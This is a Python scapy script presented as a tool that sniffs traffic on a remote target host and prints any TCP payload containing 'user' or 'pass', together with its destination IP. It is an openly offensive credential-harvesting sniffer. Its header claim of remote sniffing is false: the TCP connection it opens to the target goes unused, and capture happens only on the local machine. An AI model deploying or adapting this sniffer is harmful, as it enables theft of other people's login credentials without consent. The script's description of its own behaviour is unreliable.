#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: March 4th 2024
# Description of Script
# The script enables remote packet sniffing on a target host specified by the user. It prompts 
# the user to input the target host's IP address and port, establishes a TCP connection to the 
# remote host, and then allows the user to define packet filters based on port numbers. Once 
# configured, the script initiates packet sniffing on the specified ports, intercepting TCP 
# packets and checking for payload containing sensitive information like usernames or passwords.
# If such data is detected, it prints out the destination IP address and the payload content 
# for further inspection.
#################################################################################################
import socket
from scapy.all import sniff, TCP, IP

def packet_callback(packet):
    """
    Callback function called for each packet.
    It checks if the packet is TCP and contains payload.
    If the payload contains 'user' or 'pass', it prints the destination IP and payload.
    """
    if TCP in packet and packet[TCP].payload:
        payload_str = str(packet[TCP].payload)
        if 'user' in payload_str.lower() or 'pass' in payload_str.lower():
            print(f"[*] Destination: {packet[IP].dst}")
            print(f"[*] {payload_str}")

def main():
    """
    Main function to configure filters and start packet sniffing.
    It prompts the user to add filters based on port numbers and starts sniffing packets.
    """
    remote_host = input("Enter the target host IP address: ")
    remote_port = int(input("Enter the target host port: "))

    # Establishing connection to the remote host
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((remote_host, remote_port))

    filters = []
    while True:
        user_input = input("Do you want to add more filters? (yes/no): ")
        if user_input.lower() != 'yes':
            break
        port = int(input("Enter the port number: "))
        filters.append(f'tcp port {port}')
    filter_str = ' or '.join(filters)
    print(f"Applying filter: {filter_str}")

    # Start packet sniffing
    sniff(filter=filter_str, prn=packet_callback)

if __name__ == '__main__':
    # Call the main function to start packet sniffing
    main()
